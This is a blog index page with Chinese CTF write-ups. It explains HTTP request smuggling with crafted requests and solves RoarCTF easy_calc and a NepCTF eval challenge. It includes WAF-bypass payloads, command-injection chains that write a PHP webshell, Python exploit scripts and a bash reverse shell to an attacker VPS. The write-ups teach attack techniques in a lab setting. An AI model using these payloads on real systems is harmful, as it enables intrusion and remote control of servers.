<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    

    <!--Author-->
    
        <meta name="author" content="0xEaS">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="船到桥头自然直"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="船到桥头自然直"/>

    <!--Type page-->
    
        <meta property="og:type" content="website" />
    

    <!--Page Cover-->
    

    
        <meta name="twitter:card" content="summary" />
    
    
    

    <!-- Title -->
    
    <title>page - 船到桥头自然直</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/style.css">


    <!-- Google Analytics -->
    


<meta name="generator" content="Hexo 5.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about.html">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact.html">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
            <h1 id="main-title" class="title">船到桥头自然直</h1>
        
    </div>
</header>

        <section class="main">
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/03/25/%E6%B5%85%E6%9E%90http%E8%B5%B0%E7%A7%81/">
                浅析http走私
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-25</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h3 id="HTTP请求走私是什么"><a href="#HTTP请求走私是什么" class="headerlink" title="HTTP请求走私是什么"></a>HTTP请求走私是什么</h3><p>HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。</p>
<h3 id="为什么会形成HTTP请求走私漏洞"><a href="#为什么会形成HTTP请求走私漏洞" class="headerlink" title="为什么会形成HTTP请求走私漏洞"></a>为什么会形成HTTP请求走私漏洞</h3><p><strong>前端服务器(CDN)**和</strong>后端服务器<strong>接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞的产生。<br>大多数HTTP请求走私漏洞的出现是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：</strong>Content-Length<strong>标头和</strong>Transfer-Encoding**标头。<br>同时使用两种不同的方法时，Content-Length无效。当使用多个服务器时，对客户端传入的数据理解不一致时，就会出现有些服务器认为Content-Length的长度有效，有些以Transfer-Encoding有效。而一般情况下，反向代理服务器与后端的源站服务器之间，会重用TCP链接。这样超出的长度就会拼接到下一次请求进行请求。</p>
<p>当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p>
<h3 id="为什么会出现多次请求"><a href="#为什么会出现多次请求" class="headerlink" title="为什么会出现多次请求"></a>为什么会出现多次请求</h3><p>这与最为广泛的HTTP 1.1的协议特性——<code>Keep-Alive&amp;Pipeline</code>有关。<br>在<code>HTTP1.0</code>之前的协议设计中，客户端每进行一次HTTP请求，需要同服务器建立一个TCP链接。<br>而现代的Web页面是由多种资源组成的，要获取一个网页的内容，不仅要请求HTML文档，还有JS、CSS、图片等各种资源，如果按照之前的协议设计，就会导致HTTP服务器的负载开销增大。于是在<code>HTTP1.1</code>中，增加了<code>Keep-Alive</code>和<code>Pipeline</code>这两个特性。</p>
<p><strong>Keep-Alive</strong>：在HTTP请求中增加一个特殊的请求头<code>Connection: Keep-Alive</code>，告诉服务器，接收完这次HTTP请求后，不要关闭<code>TCP链接</code>，后面对相同目标服务器的HTTP请求，重用这一个TCP链接。这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。这个特性在<code>HTTP1.1</code>中默认开启的。<br>**Pipeline(http管线化)**：http管线化是一项实现了多个http请求但不需要等待响应就能够写进同一个socket的技术，仅有http1.1规范支持http管线化。在这里，客户端可以像流水线一样发送自己的<code>HTTP</code>请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。</p>
<p>现在，浏览器默认不启用<code>Pipeline</code>的，但是一般的服务器都提供了对<code>Pipleline</code>的支持。</p>
<p>为了提升用户的浏览速度，提高使用体验，减轻服务器的负担，很多网站都用上了CDN加速服务，最简单的加速服务，就是在源站的前面加上一个具有缓存功能的反向代理服务器，用户在请求某些静态资源时，直接从代理服务器中就可以获取到，不用再从源站所在服务器获取</p>
<p><strong>拓扑图</strong></p>
<p><img src="/images/1.jpg"></p>
<p><img src="/images/59.png"></p>
<h3 id="HTTP请求走私攻击的五种方式"><a href="#HTTP请求走私攻击的五种方式" class="headerlink" title="HTTP请求走私攻击的五种方式"></a>HTTP请求走私攻击的五种方式</h3><h4 id="CL不为0"><a href="#CL不为0" class="headerlink" title="CL不为0"></a>CL不为0</h4><p>所有不携带请求体的HTTP请求都有可能受此影响。这里用GET请求举例。<br>前端代理服务器允许GET请求携带请求体；后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的<code>Content-Length</code>头，不进行处理。这就有可能导致请求走私。</p>
<p><strong>构造请求示例</strong>：</p>
<pre><code>GET / HTTP/1.1\r\n
Host: test.com\r\n
Content-Length: 44\r\n

GET / secret HTTP/1.1\r\n
Host: test.com\r\n
\r\n</code></pre>
<blockquote>
<pre><code>\r\n`是换行的意思，windows的换行是`\r\n`，unix的是`\n`，mac的是`\r</code></pre>
</blockquote>
<p><strong>攻击流程</strong>：<br>前端服务器收到该请求，读取<code>Content-Length</code>，判断这是一个完整的请求。<br>然后转发给后端服务器，后端服务器收到后，因为它不对<code>Content-Length</code>进行处理，由于<code>Pipeline</code>的存在，后端服务器就认为这是收到了两个请求，分别是：</p>
<p>第一个：</p>
<pre><code>GET / HTTP/1.1\r\n
Host: test.com\r\n</code></pre>
<p>第二个：</p>
<pre><code>GET / secret HTTP/1.1\r\n
Host: test.com\r\n</code></pre>
<p>所以造成了请求走私。</p>
<h4 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h4><p><strong>RFC7230规范</strong></p>
<blockquote>
<p>在RFC7230的第3.3.3节中的第四条中，规定当服务器收到的请求中包含两个<code>Content-Length</code>，而且两者的值不同时，需要返回400错误。</p>
</blockquote>
<p>有些服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误。<br>但是中间代理服务器按照第一个<code>Content-Length</code>的值对请求进行处理，而后端源站服务器按照第二个<code>Content-Length</code>的值进行处理。<br><strong>构造请求示例</strong>：</p>
<pre><code>POST / HTTP/1.1\r\n
Host: test.com\r\n
Content-Length: 8\r\n
Content-Length: 7\r\n

12345\r\n
a</code></pre>
<p><strong>攻击流程</strong>：<br>中间代理服务器获取到的数据包的长度为8，将上述整个数据包原封不动的转发给后端的源站服务器。<br>而后端服务器获取到的数据包长度为7。当读取完前7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。而此时的缓冲区去还剩余一个字母<code>a</code>，对于后端服务器来说，这个<code>a</code>是下一个请求的一部分，但是还没有传输完毕。<br>如果此时有一个其他的正常用户对服务器进行了请求：</p>
<pre><code>GET /index.html HTTP/1.1\r\n
Host: test.com\r\n</code></pre>
<p>因为代理服务器与源站服务器之间一般会重用TCP连接。所以正常用户的请求就拼接到了字母<code>a</code>的后面，当后端服务器接收完毕后，它实际处理的请求其实是：</p>
<pre><code>aGET /index.html HTTP/1.1\r\n
Host: test.com\r\n</code></pre>
<p>这时，用户就会收到一个类似于<code>aGET request method not found</code>的报错。这样就实现了一次HTTP走私攻击，而且还对正常用户的行为造成了影响，而且还可以扩展成类似于CSRF的攻击方式。</p>
<p>但是一般的服务器都不会接受这种存在两个请求头的请求包。该怎么办呢？<br>所以想到前面所说的<br><strong>RFC2616规范</strong></p>
<blockquote>
<p>如果收到同时存在<code>Content-Length</code>和<code>Transfer-Encoding</code>这两个请求头的请求包时，在处理的时候必须忽略<code>Content-Length</code>。</p>
</blockquote>
<p>所以请求包中同时包含这两个请求头并不算违规，服务器也不需要返回400错误。导致服务器在这里的实现更容易出问题。</p>
<h4 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h4><p>CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理<code>Content-Length</code>请求头，而后端服务器会遵守<code>RFC2616</code>的规定，忽略掉<code>Content-Length</code>，处理<code>Transfer-Encoding</code>请求头。</p>
<p><strong>chunk传输数据(size的值由16进制表示)</strong></p>
<pre><code>[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]</code></pre>
<p><strong>chunked编码</strong><br>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/yankai0219/article/details/8269922">http协议中content-length 以及chunked编码分析</a><br><strong>构造请求示例</strong>：</p>
<pre><code>POST / HTTP/1.1\r\n
Host: test.com\r\n
......
Connection: keep-alive\r\n
Content-Length: 6\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
a</code></pre>
<p>连续发送几次请求就可以获得响应。<br><strong>攻击流程</strong>：<br>由于前端服务器处理<code>Content-Length</code>，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是</p>
<pre><code>0\r\n
\r\n
a</code></pre>
<p>当请求包经过代理服务器转发给后端服务器时，后端服务器处理<code>Transfer-Encoding</code>，当它读取到</p>
<pre><code>0\r\n
\r\n</code></pre>
<p>认为已经读取到结尾了。<br>但剩下的字母<code>a</code>就被留在了缓冲区中，等待下一次请求。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求：</p>
<pre><code>aPOST / HTTP/1.1\r\n
Host: test.com\r\n
......</code></pre>
<p>服务器在解析时就会产生报错了，从而造成HTTP请求走私。</p>
<h4 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h4><p>TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理<code>Transfer-Encoding</code>请求头，后端服务器处理<code>Content-Length</code>请求头。<br><strong>构造请求示例</strong>：</p>
<pre><code>POST / HTTP/1.1\r\n
Host: test.com\r\n
......
Content-Length: 4\r\n
Transfer-Encoding: chunked\r\n
\r\n
12\r\n
aPOST / HTTP/1.1\r\n
\r\n
0\r\n
\r\n</code></pre>
<p><strong>攻击流程</strong>：<br>前端服务器处理<code>Transfer-Encoding</code>，当其读取到</p>
<pre><code>0\r\n
\r\n</code></pre>
<p>认为是读取完毕了。<br>此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理<code>Content-Length</code>请求头，因为请求体的长度为<code>4</code>.也就是当它读取完</p>
<pre><code>12\r\n</code></pre>
<p>就认为这个请求已经结束了。后面的数据就认为是另一个请求：</p>
<pre><code>aPOST / HTTP/1.1\r\n
\r\n
0\r\n
\r\n</code></pre>
<p>成功报错，造成HTTP请求走私。</p>
<h4 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h4><p>TE-TE，当收到存在两个请求头的请求包时，前后端服务器都处理<code>Transfer-Encoding</code>请求头，确实是实现了RFC的标准。不过前后端服务器不是同一种。这就有了一种方法，我们可以对发送的请求包中的<code>Transfer-Encoding</code>进行某种混淆操作(如某个字符改变大小写)，从而使其中一个服务器不处理<code>Transfer-Encoding</code>请求头。在某种意义上这还是<code>CL-TE</code>或者<code>TE-CL</code>。<br><strong>构造请求示例</strong>：</p>
<pre><code>POST / HTTP/1.1\r\n
Host: test.com\r\n
......
Content-length: 4\r\n
Transfer-Encoding: chunked\r\n
Transfer-encoding: cow\r\n
\r\n
5c\r\n
aPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n</code></pre>
<p><strong>攻击流程</strong>：<br>前端服务器处理<code>Transfer-Encoding</code>，当其读取到</p>
<pre><code>0\r\n
\r\n</code></pre>
<p>认为是读取结束。<br>此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器处理<code>Transfer-encoding</code>请求头，将<code>Transfer-Encoding</code>隐藏在服务端的一个<code>chain</code>中时，它将会回退到使用<code>Content-Length</code>去发送请求。读取到</p>
<pre><code>5c\r\n</code></pre>
<p>认为是读取完毕了。后面的数据就认为是另一个请求：</p>
<pre><code>aPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n</code></pre>
<p>成功报错，造成HTTP请求走私。</p>
<h3 id="RoarCTF2019-Web：easy-calc（大佬解法）"><a href="#RoarCTF2019-Web：easy-calc（大佬解法）" class="headerlink" title="RoarCTF2019-Web：easy_calc（大佬解法）"></a>RoarCTF2019-Web：easy_calc（大佬解法）</h3><p>这道题是国赛的love_math的修改版。国赛题<code>love_math</code>参考Smi1e师傅的Writeup：<a target="_blank" rel="noopener" href="https://www.smi1e.top/%E5%9B%BD%E8%B5%9Blove_math%E9%A2%98%E8%A7%A3/">国赛love_math题解</a><br>输入<code>calc.php</code>，发现了网站源码</p>
<p><img src="/images/52.png"><br>这道题除去了长度限制，payload中不能包含</p>
<blockquote>
<p>‘ ‘, ‘\t’, ‘\r’, ‘\n’,’’’, ‘“‘, ‘`’, ‘[‘, ‘]’等字符</p>
</blockquote>
<p>师傅的Writeup还说网站加了waf，需要绕过waf。所以还需要绕过waf，测试发现当我们提交一些字符时，会直接<code>403</code>。<code>403</code>？！应该就是走私报错了，经测试发现的确存在服务器存在http走私漏洞，可以用来绕waf。</p>
<p>因禁了一些字符，所以不能直接getflag，需要继续分析payload构造。</p>
<h5 id="相关PHP函数"><a href="#相关PHP函数" class="headerlink" title="相关PHP函数"></a>相关PHP函数</h5><p><strong>scandir() 函数</strong>返回指定目录中的文件和目录的数组。<br><strong>base_convert() 函数</strong>在任意进制之间转换数字。<br><strong>dechex() 函数</strong>把十进制转换为十六进制。<br><strong>hex2bin() 函数</strong>：把十六进制值的字符串转换为 ASCII 字符。<br><strong>readfile() 函数</strong>输出一个文件。<br>该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。</p>
<h5 id="HTTP走私绕过WAF"><a href="#HTTP走私绕过WAF" class="headerlink" title="HTTP走私绕过WAF"></a>HTTP走私绕过WAF</h5><p><strong>测试示例</strong><br><em>1、HTTP请求走私测试2(CL-CL漏洞)</em><br>两个CL直接导致前端转发的服务器400，而且完整转发了post包给后端。<br><img src="/images/53.png"><br><em>2、HTTP请求走私测试1(CL-TE漏洞)</em><br>CL和TE直接导致前端转发的服务器400，而且完整转发了post包给后端。<br><img src="/images/54.png"><br>其它几种请求走私依旧可以，就不测试了。</p>
<p><strong>构造payload获得Flag</strong><br>使用<code>scandir()函数</code>、<code>readfile()函数</code>、<code>base_convert()函数</code>、<code>dechex() 函数</code>、<code>hex2bin() 函数</code>（<code>chr()函数</code>）<br>36进制<code>scandir</code>-&gt;10进制61693386291<br>36进制<code>readfile</code>-&gt;10进制2146934604002<br>ascii码<code>/</code>-&gt;16进制2f-&gt;10进制47<br>36进制f1agg-&gt;10进制25254448(读取根目录得到的)<br><em>1、列目录</em><br>首先要使用<code>scandir()函数</code>，尝试构造payload列举根目录下的文件。<br><code>scandir()</code>可以用<code>base_convert()函数</code>构造，但是利用<code>base_convert()</code>只能解决<code>a~z</code>的利用。<br>因为根目录需要<code>/</code>符号，且不在<code>a~z</code>,所以需要<code>hex2bin(dechex(47))</code>这种构造方式，<code>dechex() 函数</code>把十进制数转换为十六进制数。<code>hex2bin() 函数</code>把十六进制值的字符串转换为 ASCII 字符。当然，也可以直接用<code>chr()函数</code></p>
<p>payload</p>
<pre><code>var_dump(base_convert(61693386291,10,36)(chr(47)))</code></pre>
<p><img src="/images/55.png"><br><em>2、读取flag</em></p>
<p>payload</p>
<pre><code>var_dump(base_convert(2146934604002,10,36)(chr(47).base_convert(25254448,10,36)))</code></pre>
<p><img src="/images/56.png"></p>
<h4 id="RoarCTF2019-Web：easy-calc（本人解法）"><a href="#RoarCTF2019-Web：easy-calc（本人解法）" class="headerlink" title="RoarCTF2019-Web：easy_calc（本人解法）"></a>RoarCTF2019-Web：easy_calc（本人解法）</h4><p>测试发现/应该过滤了，进行改变就行chr(47)=/</p>
<p><img src="/images/57.png"></p>
<p><img src="/images/58.png"></p>
<p><strong>!!!注这里是f1agg 不是flagg!!!</strong></p>
<h3 id="RoarCTF-2019-Easy-Calc-利用php字符串解析特性"><a href="#RoarCTF-2019-Easy-Calc-利用php字符串解析特性" class="headerlink" title="[RoarCTF 2019]Easy Calc(利用php字符串解析特性)"></a>[RoarCTF 2019]Easy Calc(利用php字符串解析特性)</h3><p><strong>PHP的字符串解析特性</strong><br>这是别人对PHP字符串解析漏洞的理解，<br>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
<p>/news.php?%20news[id%00=42”+AND+1=0–</p>
<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>
<p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>
<pre><code>1.删除空白符
2.将某些字符转换为下划线（包括空格）</code></pre>
<p><strong>waf绕过</strong></p>
<p>waf并不是说，题目是用php写的，那么waf就一定是用php写的。也正因如此，这题的waf才会无法识别“ num”和“num”其实是一样的。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
<p>payload</p>
<p>这里应该是过滤了/所以用chr(47)绕过</p>
<pre><code>? num=print_r(scandir(chr(47)))
? num=readfile(chr(47).f1agg)</code></pre>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6654#toc-5">https://xz.aliyun.com/t/6654#toc-5</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188293">https://www.anquanke.com/post/id/188293</a></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/03/23/nepctf%E6%80%BB%E7%BB%93/">
                nepctf总结
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-23</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h3 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h3><p>题目源码</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$nep</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'nep'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$len</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'len'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">8</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$nep</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
<span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$nep</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>
<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'too long!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token delimiter">?></span></code></pre>
<h4 id="解法1"><a href="#解法1" class="headerlink" title="#解法1"></a>#解法1</h4><pre><code>nep=`ls&gt;z`;&amp;len=7
nep=`&gt;cat`;&amp;len=7
nep=`*&gt;z`;&amp;len=7
反引号`里的内容会被当做shell命令执行。
注：构建的文件名字母不要在c前面。</code></pre>
<p>*<em>输入统配符</em> ，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数**</p>
<p><img src="/images/44.png"></p>
<h4 id="解法2"><a href="#解法2" class="headerlink" title="#解法2"></a>#解法2</h4><pre><code>nep=`$_GET[a]`;1&amp;len=-1&amp;a=echo &quot;&lt;?php eval(\$_POST[1]);&quot;&gt;fox.php
注意特殊字符的转义</code></pre>
<p><img src="/images/45.png"></p>
<h4 id="解法3"><a href="#解法3" class="headerlink" title="#解法3"></a>#解法3</h4><p>payload</p>
<pre><code>echo &lt;?php eval($_GET[1]); &gt; 3.php
echo PD9waHAgZXZhbCgkX0dFVFsxXSk7 |base64 -d &gt; 3.php</code></pre>
<pre><code>&gt;hp
&gt;3.p\\
&gt;d\&gt;\\
&gt;\ -\\
&gt;e64\\
&gt;bas\\
&gt;7\|\\
&gt;XSk\\
&gt;Fsx\\
&gt;dFV\\
&gt;kX0\\
&gt;bCg\\
&gt;XZh\\
&gt;AgZ\\
&gt;waH\\
&gt;PD9\\
&gt;o\ \\
&gt;ech\\
ls -t&gt;0
sh 0</code></pre>
<pre><code>&gt;a    #虽然没有输入但是会创建a这个文件
ls -t    #在linux中,我们使用ls -t命令后,可以将文件名按照时间顺序排列出来（后创建的排在前面）
sh a    #sh会把a里面的每行内容当作命令来执行
使用\进行命令拼接    #l\ s    =    ls
base64    #使用base64编码避免特殊字符
传输的两端用Base64来编码和解码，保证数据不被url转义破坏</code></pre>
<p><img src="/images/46.png"></p>
<p>exp</p>
<pre class=" language-python"><code class="language-python">自己写的，勿喷
<span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">"http://e1f5a131-8214-436e-86b8-e54e39981da5.node1.hackingfor.fun/1b5337d0c8ad813197b506146d8d503d/?nep=&amp;#123;&amp;#125;&amp;len=-1"</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] attack start"</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"payload.txt"</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> f<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token string">'`'</span><span class="token operator">+</span>i<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'`;a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token string">'`'</span><span class="token operator">+</span>i<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'`;a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://e1f5a131-8214-436e-86b8-e54e39981da5.node1.hackingfor.fun/1b5337d0c8ad813197b506146d8d503d/1.php"</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] attack success"</span><span class="token punctuation">)</span>    </code></pre>
<pre><code>官方的
# -*- coding: UTF-8 -*-
import requests
p = r&#39;&#39;&#39;&gt;hp
&gt;1.p\\
&gt;d\&gt;\\
&gt;\ -\\
&gt;e64\\
&gt;bas\\
&gt;7\|\\
&gt;XSk\\
&gt;Fsx\\
&gt;dFV\\
&gt;kX0\\
&gt;bCg\\
&gt;XZh\\
&gt;AgZ\\
&gt;waH\\
&gt;PD9\\
&gt;o\ \\
&gt;ech\\
ls -t&gt;0
sh 0&#39;&#39;&#39;
url = &quot;http://192.168.130.128:10110/47c87ab02c7cac57165d0c568f0542bc/?nep=
&#123;&#125;&amp;len=-1&quot;
print(&quot;[+]start attack!!!&quot;)
for i in p.split(&#39;\n&#39;):
print(i)
payload = &#39;`&#39; + i.strip() + &#39;`;;&#39;
print(&quot;[*]&quot; + url.format(payload))
requests.get(url.format(payload))</code></pre>
<h4 id="解法4"><a href="#解法4" class="headerlink" title="#解法4"></a>#解法4</h4><pre><code>nep=`$_GET[1]`;;&amp;len=-1&amp;1=bash -i &gt;&amp; /dev/tcp/(vps的ip)/10110 0&gt;&amp;1(我个人测验失败)</code></pre>
<h3 id="梦里花开牡丹亭"><a href="#梦里花开牡丹亭" class="headerlink" title="梦里花开牡丹亭"></a>梦里花开牡丹亭</h3><p>知识点：</p>
<p>#数组绕过</p>
<p>#内置函数同名方法利用</p>
<p>#读取文件的多种命令</p>
<p>#了解基本的魔法函数在反序列过程中执行的过程</p>
<p>源码</p>
<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'shell.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">Game</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">public</span>  <span class="token variable">$username</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span>  <span class="token variable">$password</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span>  <span class="token variable">$choice</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span>  <span class="token variable">$register</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span>  <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span>  <span class="token variable">$content</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">=</span><span class="token string">'user'</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token string">'user'</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

